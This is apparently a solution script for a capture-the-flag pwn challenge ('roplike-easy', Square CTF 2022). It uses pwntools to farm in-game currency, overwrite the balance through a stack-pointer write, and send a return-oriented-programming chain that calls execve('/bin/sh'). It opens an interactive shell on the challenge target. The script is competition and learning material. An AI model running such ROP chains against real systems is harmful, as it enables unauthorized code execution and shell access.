# Square CTF 202
# pwn (300) - roplike-easy

from pwn import *

context.arch = 'amd64'
context.log_level = 'DEBUG'
#REMOTE = True
REMOTE = False

# buy Gadget i
def buy(i):
    p.sendline(str(i).encode())

# reroll shop by going to next round
def rr():
    sleep(0.1)
    p.sendline(b'c')
    p.sendline()

# send payload
def sendp(payload):
    p.sendline(b'c')
    p.sendline(payload)

gadget_base = 0x100000

if REMOTE:
    p = remote("chals.2022.squarectf.com", 4096)
else:
    p = process('./roplike-easy')

p.recvuntil(b'gadgets:')
p.recvline()


# First, we look for simple pop return gadgets to have a "ret" gadget
# Other gadgets that cost less than 2 roppis and have ret do work, but
# this is simple enough (and doesn't take too long).
print("[.] Attempting to get ret gadget in first shop...")
ret = ''
while ret == '':
    # go through each item in the shop
    for i in range(5):
        line = p.recvline()
        target_in_menu = False
        for c in '9ABCEF':
            check = f'010000005{c}C3'   # pop r?? ; ret
            if check.encode() in line:
                target_in_menu = True
                break
        if not target_in_menu:
            continue
        # the pop;ret gadget is in the menu; buy and move on
        buy(i)
        ret = p64(gadget_base + 5).hex() # [0~3]: price, [4]: pop, [5]: ret
        gadget_base += 0x1000   # one gadget in each page
        break
    if ret != '':
        break
    p.close()
    if REMOTE:
        p = remote("chals.2022.squarectf.com", 4096)
    else:
        p = process('./roplike-easy')
    sleep(1)    # necessary, because the program does srand(time(NULL))
                # so it will have the same shop within 1 second
    p.recvuntil(b'gadgets:')
    p.recvline()

print("[!] ret gadget acquired.")

# Next step: get roppis by giving payload of length 0x200
# one iteration = 32 roppis, repeat 8 times which gives 256 roppis
print("[.] Getting 256 roppis with ret gadget...")
payload = ret * (0x200 // 16)
sleep(1)
sendp(payload.encode())
for _ in range(7):
    p.recvuntil(b'gadgets:')
    sendp(payload.encode())
print("[!] Done.")


# Second step: buy required gadgets except for syscall,
# since syscall is way too expensive to get. The 0x200
# payload per round is limited by 3200 roppis, since
# there's only 100 rounds that can be played.
#
# The plan is to use the fact that these exist:
#   mov rax, rsp
#   mov [rax], rax
# We can get the offset from the $rsp when the rop chain
# starts to where the current balance of roppis are, and
# use that to overwrite the roppi balance. Stack pointer
# is a big value.
#
# roppi is a 32 bit integer, and the shop does a signed
# comparison between the balance and the price, and because
# the stack pointer's sign bit when truncated to 32 bit is
# random by ASLR, the exploit will work half the time.
# Whether it will work will be known when you try to buy
# the syscall gadget.

# Gadgets needed:
#  i |gadget                 |price   |bytes
#  0: mov rax, rsp; ret       (128)    4889E0C3
#  1: pop rbx; ret            (1)      5BC3
#  2: mov [rax], rax; ret     (32)     488900C3
#  3: add rbx, 4; ret         (1)      4883C304C3
#  4: shl rbx, 1; ret         (16)     48D1E3C3
#  5: add rax, rbx; ret       (5)      4801D8C3
#  6: pop rsi; ret            (1)      5EC3
#  7: push rax; push rbx; ret (2)      5053C3
#  8: pop rdi; ret            (1)      5FC3
#  9: pop rax; ret            (1)      58C3
# 10: pop rdx; ret            (1)      5AC3
# 11: syscall                 (FFFFFF) too long so not gonna type; does exit
gadgets_list = [
        b'4889E0C3',    # 0
        b'5BC3',        # 1
        b'488900C3',    # 2
        b'4883C304C3',  # 3
        b'48D1E3C3',    # 4
        b'4801D8C3',    # 5
        b'5EC3',        # 6
        b'5053C3',      # 7
        b'5FC3',        # 8
        b'58C3',        # 9
        b'5AC3']        # 10

gadget_count = len(gadgets_list)
gadgets_pl = ['']*gadget_count
count = 0

# until all gadgets are bought, repeat
print("[.] Buying necessary gadgets to get lots of roppis...")
rounds = 0
while count < gadget_count:
    rounds += 1
    print(f"[.] ROUND {rounds}, COUNT {count}")
    p.recvuntil(b'gadgets:')
    p.recvline()
    for i in range(5):
        p.recvuntil(b':')
        line = p.recvline().strip()
        line = line[8:]
        for idx, g in enumerate(gadgets_list):
            # if gadget in shop is what we need and hasn't been bought
            if g == line and gadgets_pl[idx] == '':
                print("[!] Buying: " + line.decode())
                buy(i)
                gadgets_pl[idx] = p64(gadget_base + 4).hex() # first 4 bytes: price
                gadget_base += 0x1000
                count += 1
                break
        if count >= gadget_count:
            break
    if count >= gadget_count:
        break
    else:
        rr()

print("[!] Gadgets acquired for getting lots of roppis.")


# offset from rsp to roppi balance taken from gdb
payload  = gadgets_pl[0]    # mov rax, rsp
payload += gadgets_pl[1]    # pop rbx
payload += p64(0).hex()     # 0; rbx = 0
payload += gadgets_pl[3]*2  # add rbx, 4; rbx = 8
payload += gadgets_pl[4]    # shl rbx, 1; rbx = 16
payload += gadgets_pl[3]    # add rbx, 4; rbx = 20
payload += gadgets_pl[4]*4  # shl rbx, 1; rbx = 320
payload += gadgets_pl[3]    # add rbx, 4; rbx = 324 (offset)
payload += gadgets_pl[5]    # rax += rbx; rax = address of roppi balance
payload += gadgets_pl[2]    # [rax] = rax; half the time roppi will be negative and won't work

sleep(1)
sendp(payload.encode())


# now add syscall gadget and buy, since we have more than enough roppi
gadgets_list.append(b'48C7C03C0000000F05C3')
gadgets_pl.append('')

didnt_check_balance = True

while gadgets_pl[gadget_count] == '':
    rounds += 1
    print(f"[.] ROUND {rounds}")
    p.recvuntil(b'gadgets:')
    p.recvline()
    for i in range(5):
        line = p.recvline().strip()
        if gadgets_list[gadget_count] in line:
            buy(i)
            # [0~3]: price, [4~10]: eax = 0x3c, which is exit syscall no.
            gadgets_pl[gadget_count] = p64(gadget_base + 11).hex() # [11]: syscall
            gadget_base += 0x1000
            break

    #####################################################################
    # Irrelevant to solution, but to nicely exit when roppi balance     #
    # is negative or when the payload unexpectedly didn't work          #
    if didnt_check_balance:
        p.recvuntil(b"Funds available: ")

        roppi_balance = int(p.recvline().strip())
        if roppi_balance < 0:
            print(f"[-] Negative roppi balance ({roppi_balance}); exiting")
            exit(255)
        elif roppi_balance < 0xffffff:
            print(f"[-] Not enough roppi balance ({roppi_balance}); exiting")
            exit(255)
        print(f"[!] {roppi_balance} roppis acquired!")
        didnt_check_balance = False
    #                                                                   #
    #####################################################################

    if gadgets_pl[gadget_count] != '':
        break
    else:
        rr()

print("[.] Attempt to buy syscall and send full ropchain")


# The aim is to call execve("/bin/sh", 0, 0)
# We will put the string "/bin/sh" at the end of our payload
# and get the offset from rsp to there via gdb
#
# This payload consists of:
#   - using rax and rbx to put the address of "/bin/sh" into rax
payload  = gadgets_pl[0]        # mov rax, rsp
payload += gadgets_pl[1]        # pop rbx
payload += p64(0).hex()         # 0; rbx = 0
payload += gadgets_pl[3] * 3    # add rbx, 4; rbx = 12
payload += gadgets_pl[4] * 2    # shl rbx, 1; rbx = 48
payload += gadgets_pl[3]        # add rbx, 4; rbx = 52
payload += gadgets_pl[4] * 4    # shl rbx, 1; rbx = 832 (offset)
payload += gadgets_pl[5]        # add rax, rbx; rax = address of "/bin/sh"
payload += gadgets_pl[1]        # pop rbx;
payload += gadgets_pl[8]        # pop rdi; rbx = address of "pop rdi" gadget
payload += gadgets_pl[7]        # push rax; push rbx; ret
                                # Pushes address of "/bin/sh", then pushes the
                                # address of "pop rdi". ret pops off the pushed
                                # "pop rdi" gadget and does pop rdi, which puts
                                # the address of "/bin/sh" into rdi
                                #
payload += gadgets_pl[9]        # pop rax
payload += p64(0x3b).hex()      # 0x3b; rax = 0x3b, syscall number for execve
payload += gadgets_pl[6]        # pop rsi
payload += p64(0).hex()         # 0; rsi = 0
payload += gadgets_pl[10]       # pop rdx
payload += p64(0).hex()         # 0; rdx = 0
payload += gadgets_pl[11]       # syscall

# fill the rest with ret gadget, leaving room for "/bin/sh"
payload += ret * ((0x200 - len(payload)) // 16 - 1)
# The offset points to /bin/sh
payload += "00000000/bin/sh\x00"

sleep(1)
sendp(payload.encode())

# Flage?
p.interactive()
